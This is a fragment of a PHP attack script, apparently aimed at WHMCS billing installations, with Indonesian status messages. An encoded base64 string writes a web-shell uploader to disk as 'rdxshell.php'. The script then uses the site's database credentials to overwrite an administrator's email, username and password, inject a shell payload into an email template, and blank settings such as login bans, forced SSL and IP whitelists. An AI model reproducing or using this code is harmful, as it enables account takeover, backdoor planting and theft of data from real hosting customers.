GamEyZHliM1Z1WkMxamIyeHZjam9qTURBd01EQXdJaUJ1WVcxbFBTSm1hV3hsSWlCemFYcGxQU0l6TUNJK1BHbHVjSFYwSUc1aGJXVTlJbDkxY0d3aUlITjBlV3hsUFNKamIyeHZjanBzYVcxbE8ySmhZMnRuY205MWJtUXRZMjlzYjNJNkl6QXdNREF3TUNJZ2RIbHdaVDBpYzNWaWJXbDBJaUJwWkQwaVgzVndiQ0lnZG1Gc2RXVTlJbFZ3Ykc5aFpDSStQQzltYjNKdFBpYzdEUXBwWmlnZ0pGOVFUMU5VV3lkZmRYQnNKMTBnUFQwZ0lsVndiRzloWkNJZ0tTQjdEUXBwWmloQVkyOXdlU2drWDBaSlRFVlRXeWRtYVd4bEoxMWJKM1J0Y0Y5dVlXMWxKMTBzSUNSZlVFOVRWRnNuZFhCc2IyRmtkRzhuWFM0bkx5Y3VKRjlHU1V4RlUxc25abWxzWlNkZFd5ZHVZVzFsSjEwcEtTQjdEUW9OQ21WamFHOGdKenhtYjI1MElHTnZiRzl5UFNKc2FXMWxJajViSzEwZ1ZYQnNiMkZrSUZOMWEzTmxjeUE2ZGlBOFluSXZQaUJiSzEwZ0p5NGtYMUJQVTFSYkozVndiRzloWkhSdkoxMHVJaThpTGlSZlJrbE1SVk5iSjJacGJHVW5YVnNuYm1GdFpTZGRPdzBLZlNCbGJITmxJSHNOQ21WamFHOGdKMXQrWFNCVmNHeHZZV1FnUm1GcGJHVmtJRlJmVkNCYmZsMDhMMlp2Ym5RK1BHSnlQaWM3RFFwOUlIME5DajgrRFFvPScpOw0KDQokZm9wZW4gPSBmb3BlbiAoJ3JkeHNoZWxsLnBocCcsJ3cnKTsNCiR3cml0ZSAgPSBmd3JpdGUoJGZvcGVuICwgJGMwZGUpOw=='));{/php}";
if(isset($_POST['hajar'])) {
$anune = $_POST['anune'];
require("$anune");
@mysql_connect($db_host,$db_username,$db_password);
@mysql_select_db($db_name);

$shell=str_replace("'","'",$shell);
$gosok_shell = $shell;
$iduser=str_replace("'","'",$iduser);
$target_id = $_POST['iduser'];
$firstname=str_replace("'","'",$firstname);
$gantifirstname = $_POST['firstname'];
$lastname=str_replace("'","'",$lastname);
$gantilastname = $_POST['lastname'];
$emailbaru=str_replace("'","'",$emailbaru);
$ganti_email = $_POST['emailbaru'];
$userbaru=str_replace("'","'",$userbaru);
$ganti_user = $_POST['userbaru'];
$passbaru=str_replace("'","'",$passbaru);
$hash_pass = $_POST['passbaru'];
$ganti_pass = md5($hash_pass); 

$colok1 = "UPDATE tblemailtemplates SET message ='".$gosok_shell."' WHERE id ='9'";
$colok1a = "UPDATE tbladmins SET email ='".$ganti_email."' WHERE id ='".$target_id."'"; 
$colok1a1 = "UPDATE tbladmins SET firstname ='".$gantifirstname."' WHERE id ='".$target_id."'"; 
$colok1a2 = "UPDATE tbladmins SET lastname ='".$gantilastname."' WHERE id ='".$target_id."'"; 
$colok2 = "UPDATE tbladmins SET username ='".$ganti_user."' WHERE id ='".$target_id."'";
$colok3 = "UPDATE tbladmins SET password ='".$ganti_pass."' WHERE id ='".$target_id."'"; 
$crot1 = "UPDATE tblconfiguration SET value='' WHERE setting='InvalidLoginBanLength'";
$crot2 = "UPDATE tblconfiguration SET value='' WHERE setting='AdminForceSSL'";
$crot3 = "UPDATE tblconfiguration SET value='' WHERE setting='RequiredPWStrength'";
$crot4 = "UPDATE tblconfiguration SET value='' WHERE setting='MaintenanceMode'";
$crot5 = "UPDATE tblconfiguration SET value='' WHERE setting='APIAllowedIPs'";
$crot6 = "UPDATE tblconfiguration SET value='' WHERE setting='LoginFailures'";
$crot7 = "UPDATE tblconfiguration SET value='' WHERE setting='InstanceID'";
$crot8 = "UPDATE tblconfiguration SET value='' WHERE setting='WhitelistedIPs'";
$crot9 = "UPDATE tblconfiguration SET value='' WHERE setting='ToggleInfoPopup'";
$crot10 = "UPDATE tblconfiguration SET value='' WHERE setting='token_namespaces'";

$udah_ganteng=@mysql_query($crot1);
$udah_ganteng=@mysql_query($crot2);
$udah_ganteng=@mysql_query($crot3);
$udah_ganteng=@mysql_query($crot4);
$udah_ganteng=@mysql_query($crot5);
$udah_ganteng=@mysql_query($crot6);
$udah_ganteng=@mysql_query($crot7);
$udah_ganteng=@mysql_query($crot8);
$udah_ganteng=@mysql_query($crot9);
$udah_ganteng=@mysql_query($crot10); 
$udah_ganteng=@mysql_query($colok1);
$udah_ganteng=@mysql_query($colok1a);
$udah_ganteng=@mysql_query($colok1a1);
$udah_ganteng=@mysql_query($colok1a2);
$udah_ganteng=@mysql_query($colok2);
$udah_ganteng=@mysql_query($colok3); 
if($udah_ganteng)
{
echo "<font color='white'>SUKSES COK :P </font><br></div></div></div></div></div></div>";
}
}
?>
